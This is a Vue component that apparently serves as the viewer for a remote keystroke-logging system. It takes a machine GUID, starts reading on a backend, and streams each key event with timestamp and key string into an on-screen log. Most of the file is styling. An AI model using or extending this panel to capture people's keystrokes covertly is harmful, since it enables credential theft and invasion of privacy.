<template>
  <div>
    <h1>Log</h1>
    <p>첫 페이지.</p>

    <div class="controls">
      <input
          v-model.trim="input"
          placeholder="input machine_guid"
          @keydown.enter.prevent="scan"
          :disabled="isLoading"
      />

      <button
          class="scan-btn"
          type="button"
          @click="scan"
          :disabled="isLoading || !input"
      >
        {{ isLoading ? "Connecting..." : "Scan" }}
      </button>
    </div>

    <pre class="log">text_log:
{{ text_log }}</pre>
  </div>
</template>

<script>
import api from "@/api/index.js";

export default {
  data() {
    return {
      API_BASE: import.meta.env.VITE_API_URL,
      input: "",
      text_log: "",
      clientId: null,
      es: null,
      recentAgents: null,
      isLoading: false, // ✅ 추가
    };
  },
  mounted() {
    this.clientId = "web-" + crypto.randomUUID();
    console.log("clientId fixed:", this.clientId);
  },
  unmounted() {
    if (this.es) this.es.close();
  },
  methods: {
    async scan() {
      if (this.isLoading) return;
      if (!this.input) return;

      console.log("[LogView] Scan:", this.input);
      this.isLoading = true;

      try {
        const resp = await api.post(
            `/api/backend/readStart/${encodeURIComponent(this.input)}/${encodeURIComponent(this.clientId)}`
        );
        this.recentAgents = resp.data;

        const sse_url = `${this.API_BASE}/api/sse/stream/${encodeURIComponent(this.input)}`;
        if (this.es) this.es.close();
        this.es = new EventSource(sse_url);

        this.es.addEventListener("keyevent", (e) => {
          const data = JSON.parse(e.data);
          const { timeStamp, capsLock, eventType, keyString } = data;

          console.log("keyevent:", data);
          this.text_log += `${timeStamp}\t${capsLock}\t${eventType}\t${keyString}\n`;
        });

        this.es.addEventListener("connected", (e) => {
          console.log("connected:", e.data);
        });

        this.es.onerror = (err) => {
          console.log("SSE error:", err);
        };
      } catch (e) {
        console.log(e);
      } finally {
        this.isLoading = false;
      }
    },
  },
};
</script>

<style scoped>
/* 전체 레이아웃을 카드처럼 */
:root {
  /* scoped에서도 변수는 그냥 편하게 쓰자 */
}

.controls {
  display: flex;
  gap: 12px;
  align-items: center;
  margin: 14px 0 10px;

  padding: 14px;
  border-radius: 16px;

  background: rgba(255, 255, 255, 0.7);
  border: 1px solid rgba(15, 23, 42, 0.12);
  box-shadow: 0 10px 24px rgba(15, 23, 42, 0.06);

  backdrop-filter: blur(10px);
}

@media (prefers-color-scheme: dark) {
  .controls {
    background: rgba(15, 23, 42, 0.55);
    border-color: rgba(148, 163, 184, 0.18);
    box-shadow: 0 10px 24px rgba(0, 0, 0, 0.35);
  }
}

/* 입력 */
.controls input {
  flex: 1;
  min-width: 220px;

  padding: 12px 14px;
  border-radius: 14px;

  border: 1px solid rgba(15, 23, 42, 0.16);
  background: rgba(255, 255, 255, 0.85);
  color: rgba(15, 23, 42, 0.95);

  outline: none;
  transition: border-color 140ms ease, box-shadow 140ms ease, transform 120ms ease, background-color 140ms ease;
}

@media (prefers-color-scheme: dark) {
  .controls input {
    background: rgba(2, 6, 23, 0.55);
    color: rgba(226, 232, 240, 0.95);
    border-color: rgba(148, 163, 184, 0.22);
  }
}

.controls input::placeholder {
  color: rgba(15, 23, 42, 0.45);
}

@media (prefers-color-scheme: dark) {
  .controls input::placeholder {
    color: rgba(226, 232, 240, 0.45);
  }
}

.controls input:focus {
  border-color: rgba(59, 130, 246, 0.65);
  box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.18);
}

.controls input:disabled {
  opacity: 0.65;
  cursor: not-allowed;
}

/* 버튼 */
.scan-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 10px;

  height: 44px;
  padding: 0 16px;
  border-radius: 14px;

  border: 1px solid rgba(59, 130, 246, 0.45);
  color: white;
  font-weight: 800;
  letter-spacing: 0.2px;

  background: linear-gradient(135deg, rgba(59, 130, 246, 1), rgba(37, 99, 235, 1));
  box-shadow: 0 10px 22px rgba(37, 99, 235, 0.22);

  cursor: pointer;
  user-select: none;

  transition: transform 120ms ease, box-shadow 160ms ease, filter 160ms ease;
}

.scan-btn:hover:not(:disabled) {
  filter: brightness(1.05);
  box-shadow: 0 12px 26px rgba(37, 99, 235, 0.30);
}

.scan-btn:active:not(:disabled) {
  transform: translateY(1px);
  box-shadow: 0 8px 18px rgba(37, 99, 235, 0.22);
}

.scan-btn:focus-visible {
  outline: none;
  box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.25), 0 12px 26px rgba(37, 99, 235, 0.30);
}

.scan-btn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
  filter: grayscale(0.2);
  box-shadow: none;
}

/* 로그 영역 */
.log {
  margin-top: 14px;
  padding: 14px 16px;

  border-radius: 16px;
  border: 1px solid rgba(15, 23, 42, 0.12);
  background: rgba(255, 255, 255, 0.65);

  white-space: pre-wrap;
  line-height: 1.45;

  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
  font-size: 13px;
  color: rgba(15, 23, 42, 0.92);

  box-shadow: 0 10px 24px rgba(15, 23, 42, 0.06);
  min-height: 240px;
  max-height: 520px;
  overflow: auto;
}

@media (prefers-color-scheme: dark) {
  .log {
    background: rgba(2, 6, 23, 0.55);
    border-color: rgba(148, 163, 184, 0.18);
    color: rgba(226, 232, 240, 0.9);
    box-shadow: 0 10px 24px rgba(0, 0, 0, 0.35);
  }
}

</style>
